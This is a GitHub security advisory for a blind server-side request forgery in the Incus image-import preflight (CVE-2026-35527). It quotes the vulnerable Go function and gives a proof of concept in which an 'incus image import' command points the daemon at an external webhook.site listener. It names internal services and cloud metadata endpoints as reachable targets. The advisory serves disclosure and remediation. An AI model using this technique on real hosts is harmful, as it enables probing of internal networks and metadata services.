# [M] Incus has Blind SSRF via Image Import Preflight HEAD

## Summary
Severity: Medium
Advisory: GHSA-8gw4-p4wq-4hcv
CVE: CVE-2026-35527
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-8gw4-p4wq-4hcv
Type: github-advisory

## Affected
- Go: `github.com/lxc/incus/v6/cmd/incusd` — affected >=0 <7.0.0

## Details
### Summary
A partial implementation of our `restricted.images.servers` project restriction allows users in such restricted projects to still cause Incus to send HEAD requests to arbitrary endpoints.

The actual image download will be rejected by the project restriction, but the ability to trigger arbitrary HTTP requests inside of the Incus environment can still be used as a way to discover otherwise hidden details about the environment.

### Details
The image import flow performs outbound network access to a user-supplied URL before the request is fully validated and before the import is rejected. The URL information helper constructs a HEAD request directly from the supplied source URL and immediately sends it to resolve image metadata.

A host-originated HEAD request is issued from attacker-controlled input during the image import preflight stage. In the observed reproduction, this request is sent before the flow fails on later processing requirements, such as missing image metadata headers. As a result, an authenticated user can coerce the daemon into making blind outbound HEAD requests to arbitrary destinations. This yields a blind server-side request forgery (SSRF) primitive against internal services, unroutable address space, or cloud metadata endpoints reachable by the host. This vulnerability pattern is similar to CVE-2026-24767.

Affected File:
https://github.com/lxc/incus/blob/v6.22.0/cmd/incusd/images.go 

Affected Code:
```
func imgPostURLInfo(ctx context.Context, s *state.State, r *http.Request, req api.ImagesPost, op *operations.Operation, project string, budget int64) (*api.Image, error) {
    [...]
    head, err := http.NewRequest("HEAD", req.Source.URL, nil)
    if err != nil {
        return nil, err
    }

    [...]


    head.Header.Set("User-Agent", version.UserAgent)
    head.Header.Set("Incus-Server-Architectures", strings.Join(architectures, ", "))
    head.Header.Set("Incus-Server-Version", version.Version)

    raw, err := myhttp.Do(head)
    if err != nil {
        return nil, err
    }

    hash := raw.Header.Get("Incus-Image-Hash")
    if hash == "" {
        return nil, errors.New("Missing Incus-Image-Hash header")
    }

    url := raw.Header.Get("Incus-Image-URL")
    if url == "" {
        return nil, errors.New("Missing Incus-Image-URL header")
    }

    info, _, err := ImageDownload(ctx, r, s, op, &ImageDownloadArgs{
        Server:      url,
        Protocol:    "direct",
        Alias:       hash,
        AutoUpdate:  req.AutoUpdate,
        Public:      req.Public,
        ProjectName: project,
        Budget:      budget,
    })
    [...]
}
```

The following PoC demonstrates that an authenticated user can trigger a host-originated HEAD request to an arbitrary external URL during the image import preflight stage.

Step 1: Select the reproduction project

From an Incus client with access to the target server, switch into the project used for reproduction. In this environment, the selected project was configured as restricted=true with a restrictive restricted.images.servers policy.

Command:
```
incus project switch restricted
```

Step 2: Trigger the preflight request to an arbitrary URL

From the same Incus client, attempt to import an image from an attacker-controlled or observable URL. In this example, webhook.site is used as an external listener to capture the host-originated request.

Command:
```
incus image import https://webhook.site/0270eca3-4197-4194-97b6-1280f1070c3a --alias my-ssrf-image
```

Result:
```
Error: Missing Incus-Image-Hash header
```

Step 3: Verify the outbound HEAD request in the external listener

In the webhook.site request log for the URL above, confirm that the Incus host issued a HEAD request before the import failed. In this reproduction environment, the request originated from a server running Incus v6.22.0.

Result:
```
HEAD /0270eca3-4197-4194-97b6-1280f1070c3a HTTP/1.1
Host: webhook.site
User-Agent: Incus 6.22 (Linux; x86_64; 6.19.6; Debian GNU/Linux; 13) (zfs 2.4.1-1)
Incus-Server-Version: 6.22
Incus-Server-Architectures: x86_64, i686
```

It is recommended to defer all outbound network interaction associated with URL-based image imports, including metadata preflight requests, until after the supplied URL has passed all validation and policy checks required by the import flow. If the import would later fail or be disallowed, the daemon should reject the request before issuing any network traffic.

### Credit
This issue was discovered and reported by the team at 7asecurity (https://7asecurity.com/)

## References
- https://github.com/lxc/incus/security/advisories/GHSA-8gw4-p4wq-4hcv
- https://nvd.nist.gov/vuln/detail/CVE-2026-35527
- https://github.com/lxc/incus
- https://github.com/lxc/incus/blob/v6.22.0/cmd/incusd/images.go
